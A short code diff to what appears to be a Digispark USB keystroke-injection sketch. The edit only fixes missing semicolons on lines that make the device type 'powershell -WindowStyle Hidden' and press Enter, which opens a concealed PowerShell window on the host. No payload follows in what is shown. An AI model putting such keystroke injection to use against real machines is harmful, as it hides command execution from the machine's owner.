@@ -47,9 +47,9 @@ void loop() {
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(600);
 
-   DigiKeyboard.print("powershell -WindowStyle Hidden")
-   DigiKeyboard.delay(600)
-   DigiKeyboard.sendKeyStroke(KEY_ENTER)
+   DigiKeyboard.print("powershell -WindowStyle Hidden");
+   DigiKeyboard.delay(600);
+   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
    for(int i = 0; i < 10; i++) {
        digitalWrite(ledPin, HIGH);
